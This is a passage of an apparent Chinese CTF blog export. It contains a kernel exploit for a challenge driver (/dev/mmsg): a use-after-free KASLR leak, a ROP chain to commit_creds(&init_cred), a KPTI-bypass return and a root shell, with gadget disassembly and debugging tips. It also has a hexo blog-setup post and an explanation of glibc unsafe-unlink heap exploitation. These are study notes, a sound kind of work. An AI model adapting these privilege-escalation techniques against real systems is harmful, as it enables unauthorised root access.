MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>cr3 bypass kpti，在高版本使用，在 <code>+22</code> 地址是我们利用的gadget。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure>

<ul>
<li>看别人的做法，好像不需要关注rip后面的内容，但是本题我没有使用这种方式做出来 👀。</li>
<li>最后需要我们调用getshell函数。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul>
<li><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt; 简化为 commit_creds(&amp;init_cred) init_cred: init 进程的权限，为root，在 <code>/proc/kallsyms</code> 内</p>
</li>
<li><p>寻找 gadget 时可能寻找到的gadget不能使用，报错为 <code>kernel tried to execute NX-protected page</code>，说明其地址不可访问？那就只能换了</p>
</li>
<li><p>为什么找不对gadget?或者根本没有找到🤡。和参考的看看了一下，发现gadget地址根本就没找对。</p>
<ul>
<li>ropper + ROPgadget + ropr 三个工具一起使用，获得三个gadget文件。</li>
<li>extract-vmlinux + vmlinux-to-elf 工具</li>
</ul>
</li>
<li><p>如何下断点？</p>
<ul>
<li>在想暂停的的地方使用 <code>getchar()</code> 停止后一路si</li>
<li>在固定的指令地址下断点，但是需要事先知道地址。但是rop时，地址一般都是知道的。</li>
</ul>
</li>
<li><p>在固定的指令下断点，比如此题就可以在在 add rsp 那一条指令下断点</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>uaf</tag>
      </tags>
  </entry>
  <entry>
    <title>init-blog</title>
    <url>/2023/03/19/init-blog/</url>
    <content><![CDATA[<blockquote>
<p>blog init</p>
</blockquote>
<span id="more"></span>

<h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>github + hexo</li>
</ul>
<!--more-->

<h3 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h3><ul>
<li><p><code>hexo</code> 命令报错，上网查，使用 <code>npx hexo</code></p>
</li>
<li><p>插件下载</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>

<ul>
<li>常用命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hexo init <span class="comment"># 初始化一个仓库</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># 静态界面生成</span></span><br><span class="line">npx hexo s   <span class="comment"># 本地启动 service</span></span><br><span class="line">npx hexo d   <span class="comment"># 插件。传到github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># 生成目录</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#生成文章</span></span><br></pre></td></tr></table></figure>

<ul>
<li>常用属性</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: 标题， 使用 &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: 日期, 使用 &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: 更新</span><br><span class="line">tags: 标签</span><br><span class="line">categories: 分类</span><br><span class="line">comments: 开启评论 <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><ul>
<li>obsidian 写md</li>
<li>vscode</li>
</ul>
<h2 id="持续学习"><a href="#持续学习" class="headerlink" title="持续学习"></a>持续学习</h2><ul>
<li>简单点也还行，不想折腾了。</li>
<li>官网 + google，满足一切要求</li>
</ul>
<p><a href="https://hexo.io/zh-cn/docs/">中文文档</a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>unsafe unlink</title>
    <url>/2023/09/13/unsafe%20unlink/</url>
    <content><![CDATA[<blockquote>
<p>经典漏洞</p>
</blockquote>
<span id="more"></span>

<h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p>当一个 free chunk 从双向链表的 bins 中取出时（堆的合并），这个过程就是 unlink。</p>
<p>堆的合并主要看这一段代码，存在两种合并方式</p>
<ul>
<li>int_free 参数：p是正在free的chunk，av 指 arena(struct malloc_state)，lock避免条件竞争</li>
<li>向后合并：prev_inuse位为0，会发生unsorted bin之间合并，会检查prev_size 和 想要合并的 bin 的 size 是否相同。unlink prev_chunk</li>
<li>向前合并：不是top_chunk, unlink nextchunk。</li>
<li>至于方向：在没有翻译错误的情况下，有点绕，但是可以强行解释，因为堆往高地址生长，向前就是向高地址合并，向后就是向低地址合并？</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize,就是前面的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  就是根据size进行加法，是一个宏，就是当前chunk的下一个chunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">// 当前的 arena 和 next_chunk 使用指针连接</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>unlink函数主要是指针的处理，假设3个chunk，a-b-c，a-b在unsortedbin 范围，c主要防止top_chunk合并，正常情况下</p>
<ul>
<li>首先，unsorted bin 按照free时间顺序连接，fd指向时间靠前的chunk。</li>
<li>向前合并：free b, free a。先成为 arena&lt;-&gt;b 双链表，然后在调用 unlink(av, b)。</li>
<li>向后合并：free a, free b。先成为 arena&lt;-&gt;a 双链表 在int_free 调用的是 unlink(av, a)。</li>
<li>这里就使用向后合并举例：fd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arena；在经历一个赋值语句变为 arena-&gt;bk&#x3D;arena，areba-&gt;fd&#x3D;arena。从arena&lt;-&gt;a 变成了 arena 完成unlink此操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后后续继续进入free函数里操作</p>
<ul>
<li>后续操作：此时p指向a，找到arena的bins数组，然后链入arena，设置head和foot</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// 设置size罢了</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// 设置下一个chunk的prev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure>

<p>最后：arena的bins数组存放数据：</p>
<ul>
<li>这样涉及就好像有fd，bk指针。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>相关的攻击手段。</p>
<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p>早期发现此漏洞时，没有 <code>fd-&gt;bk != p || bk-&gt;fd != p</code> 这个条件，因此直接修改 fd, bk 来进行任意地址写</p>
<ul>
<li>任意地址写，如果开了 got 表保护，可以写 hook。</li>
</ul>
<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>在没有 PIE 和 got表可以写时，可以通过修改got表。其本质是一个heap overflow这是比较简单的。</p>
<ul>
<li>主要是利用 unlink 中的代码，其中指针赋值简化为 <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li>
<li>我们控制这个 p 的内容。</li>
</ul>
<ol>
<li>按照时间 malloc A,B</li>
<li>A 堆溢出，修改A的内容 修改B的header</li>
</ol>
<ul>
<li>target &#x3D; &amp;p，需要我们可以写。或者 target就是p</li>
<li>我们在 A 里伪造一个 fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li>
<li>利用堆溢出修改 B 的header，让fake free chunk 和 B 可以合并。</li>
</ul>
<ol start="3">
<li>free B 就会 unlink，<strong>p 就是 fake free chunk</strong>，触发unlink。</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  A中伪造 =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size 过检查</span><br><span class="line">|   B     |                     |          |            prev_inuse 为0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure>


<p>how2heap 案例</p>
<ul>
<li>编译时指定no-pie</li>
<li>测试在ubuntu 22.04，可以通过assert.</li>
</ul>
